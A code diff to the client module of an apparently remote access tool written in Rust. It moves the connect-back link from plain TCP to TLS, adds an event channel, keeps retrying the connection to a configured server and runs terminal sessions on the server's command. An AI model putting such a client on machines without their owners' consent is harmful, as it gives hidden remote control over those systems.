@@ -5,27 +5,34 @@ use std::time::Duration;
 use async_trait::async_trait;
 use log::{debug, error, info, warn};
 use rat_common::framework::{ModuleImpl, ModuleState};
-use rat_common::reader::Reader;
 use rat_common::schema::{
     ClientMessage, ClientMessageData, ServerMessage, ServerMessageData, SessionCreateRequest,
     SystemInfo,
 };
 use rat_common::snowflake::SnowflakeId;
+use rustls::ClientConfig;
 use sysinfo::System;
-use tokio::io::AsyncWriteExt;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
-use tokio::net::tcp::{OwnedReadHalf, OwnedWriteHalf};
-use tokio::sync::Mutex;
+use tokio::sync::{Mutex, mpsc};
 use tokio::time::sleep;
+use tokio_rustls::TlsConnector;
+use tokio_rustls::client::TlsStream;
 
-use crate::UniversalSocketAddr;
+use crate::config::Config;
 use crate::sessions::Session;
 use crate::sessions::terminal::TerminalSession;
 
+pub enum Event {
+    Send(ClientMessage),
+    Receive(Vec<u8>),
+    Terminate,
+}
+
 pub struct Client {
-    _addr: UniversalSocketAddr,
-    _reader: Mutex<Reader<OwnedReadHalf>>,
-    _writer: Mutex<OwnedWriteHalf>,
+    _config: Config,
+    _stream: Mutex<(TlsStream<TcpStream>, mpsc::Receiver<ClientMessage>)>,
+    _sender: mpsc::Sender<ClientMessage>,
     _total_read_buf: Mutex<VecDeque<u8>>,
     _sessions: Mutex<HashMap<SnowflakeId, Arc<dyn Session>>>,
     _system: Mutex<System>,
@@ -33,16 +40,17 @@ pub struct Client {
 }
 
 impl Client {
-    pub async fn connect(addr: UniversalSocketAddr) -> Self {
-        let (reader, writer) = Self::_reconnect(&addr).await;
+    pub async fn connect(config: Config) -> Self {
+        let stream = Self::_reconnect(&config).await;
+        let (sender, receiver) = mpsc::channel(1);
 
         let mut system = System::new_all();
         system.refresh_all();
 
         Self {
-            _addr: addr,
-            _reader: Mutex::new(reader),
-            _writer: Mutex::new(writer),
+            _config: config,
+            _stream: Mutex::new((stream, receiver)),
+            _sender: sender,
             _total_read_buf: Mutex::new(VecDeque::new()),
             _sessions: Mutex::new(HashMap::new()),
             _system: Mutex::new(system),
@@ -50,13 +58,28 @@ impl Client {
         }
     }
 
-    async fn _reconnect(addr: &UniversalSocketAddr) -> (Reader<OwnedReadHalf>, OwnedWriteHalf) {
+    /// Reference: https://github.com/rustls/tokio-rustls/blob/main/examples/client.rs
+    async fn _reconnect(config: &Config) -> TlsStream<TcpStream> {
+        let tls = ClientConfig::builder()
+            .with_root_certificates(config.cert_trusted_roots.clone())
+            .with_no_client_auth();
+        let connector = TlsConnector::from(Arc::new(tls));
+
         loop {
-            match TcpStream::connect(addr).await {
-                Ok(stream) => {
-                    let (reader, writer) = stream.into_split();
-                    return (Reader::new(reader), writer);
-                }
+            match TcpStream::connect(&config.server).await {
+                Ok(stream) => match connector
+                    .connect(config.cert_server_name.clone(), stream)
+                    .await
+                {
+                    Ok(stream) => {
+                        return stream;
+                    }
+                    Err(e) => {
+                        let wait = Duration::from_millis(5000); // TODO: Exponential backoff + random jitter
+                        warn!("TLS handshake failed: {e}. Retrying in {wait:?}...");
+                        sleep(wait).await;
+                    }
+                },
                 Err(e) => {
                     let wait = Duration::from_millis(5000); // TODO: Exponential backoff + random jitter
                     warn!("Unable to connect to server: {e}. Retrying in {wait:?}...");
@@ -155,17 +178,14 @@ impl Client {
     }
 
     pub async fn send(&self, message: &ClientMessage) -> anyhow::Result<()> {
-        let data = postcard::to_stdvec_cobs(message)?;
-
-        let mut writer = self._writer.lock().await;
-        writer.write_all(&data).await?;
+        self._sender.send(message.clone()).await?;
         Ok(())
     }
 }
 
 #[async_trait]
 impl ModuleImpl for Client {
-    type EventType = anyhow::Result<usize>;
+    type EventType = Event;
 
     fn name(&self) -> &str {
         "Client"
@@ -176,84 +196,91 @@ impl ModuleImpl for Client {
     }
 
     async fn listen(self: Arc<Self>) -> Self::EventType {
-        let mut reader = self._reader.lock().await;
-        Ok(reader.read().await?)
+        let (stream, receiver) = &mut *self._stream.lock().await;
+        let mut buffer = vec![0; 1024];
+
+        tokio::select! {
+            Ok(size) = stream.read(&mut buffer) => match size {
+                0 => Event::Terminate,
+                size => {
+                    buffer.truncate(size);
+                    Event::Receive(buffer)
+                },
+            },
+            Some(message) = receiver.recv() => Event::Send(message),
+            else => Event::Terminate,
+        }
     }
 
     async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
-        let mut size = 0;
-        let closed = match event {
-            Ok(0) => true,
-            Ok(s) => {
-                size = s;
-                false
+        match event {
+            Event::Send(message) => {
+                let data = postcard::to_stdvec_cobs(&message)?;
+                let mut state = self._stream.lock().await;
+                state.0.write_all(&data).await?;
+                state.0.flush().await?;
             }
-            Err(e) => {
-                error!("Error when reading from server: {e}");
-                true
-            }
-        };
+            Event::Receive(data) => {
+                let mut total_read_buf = self._total_read_buf.lock().await;
+                let mut offset = total_read_buf.len();
+                total_read_buf.extend(data);
 
-        if closed {
-            error!("Server disconnected. Reconnecting...");
+                while offset < total_read_buf.len() {
+                    if total_read_buf[offset] == 0 {
+                        let mut frame = total_read_buf.drain(..=offset).collect::<Vec<u8>>();
+                        offset = 0;
 
-            let (new_reader, new_writer) = tokio::select! {
-                pair = Self::_reconnect(&self._addr) => pair,
-                _ = self.wait_until_stopped() => {
-                    return Ok(());
-                }
-            };
-
-            info!("Reconnected to server");
-
-            let mut reader = self._reader.lock().await;
-            let mut writer = self._writer.lock().await;
-            let mut total_read_buf = self._total_read_buf.lock().await;
-
-            *reader = new_reader;
-            *writer = new_writer;
-            total_read_buf.clear();
-        }
-
-        let reader = self._reader.lock().await;
-        let mut total_read_buf = self._total_read_buf.lock().await;
-        let mut offset = total_read_buf.len();
-
-        total_read_buf.extend(reader.prefix(size));
-        while offset < total_read_buf.len() {
-            if total_read_buf[offset] == 0 {
-                let mut frame = total_read_buf.drain(..=offset).collect::<Vec<u8>>();
-                offset = 0;
-
-                let self_c = self.clone();
-                tokio::spawn(async move {
-                    match postcard::from_bytes_cobs::<ServerMessage>(&mut frame) {
-                        Ok(message) => {
-                            let id = message.id;
-                            match self_c.clone()._process_message(message).await {
-                                Ok(response) => {
-                                    let _ = self_c.send(&response).await;
+                        let self_c = self.clone();
+                        tokio::spawn(async move {
+                            match postcard::from_bytes_cobs::<ServerMessage>(&mut frame) {
+                                Ok(message) => {
+                                    let id = message.id;
+                                    match self_c.clone()._process_message(message).await {
+                                        Ok(response) => {
+                                            let _ = self_c.send(&response).await;
+                                        }
+                                        Err(e) => {
+                                            error!("Error processing message from server: {e}");
+                                            let _ = self_c
+                                                .send(&ClientMessage {
+                                                    id,
+                                                    data: ClientMessageData::Error {
+                                                        message: e.to_string(),
+                                                    },
+                                                })
+                                                .await;
+                                        }
+                                    }
                                 }
                                 Err(e) => {
-                                    error!("Error processing message from server: {e}");
-                                    let _ = self_c
-                                        .send(&ClientMessage {
-                                            id,
-                                            data: ClientMessageData::Error {
-                                                message: e.to_string(),
-                                            },
-                                        })
-                                        .await;
+                                    error!(
+                                        "Received malformed message from server: {frame:02X?} ({e})"
+                                    );
                                 }
                             }
-                        }
-                        Err(e) => {
-                            error!("Received malformed message from server: {frame:02X?} ({e})");
-                        }
+                        });
+                    } else {
+                        offset += 1;
                     }
-                });
-            } else {
-                offset += 1;
+                }
+            }
+            Event::Terminate => {
+                error!("Server disconnected. Reconnecting...");
+
+                let new_stream = tokio::select! {
+                    s = Self::_reconnect(&self._config) => s,
+                    _ = self.wait_until_stopped() => {
+                        return Ok(());
+                    }
+                };
+
+                info!("Reconnected to server");
+
+                let mut state = self._stream.lock().await;
+                let mut total_read_buf = self._total_read_buf.lock().await;
+
+                state.0 = new_stream;
+                total_read_buf.clear();
             }
         }
 
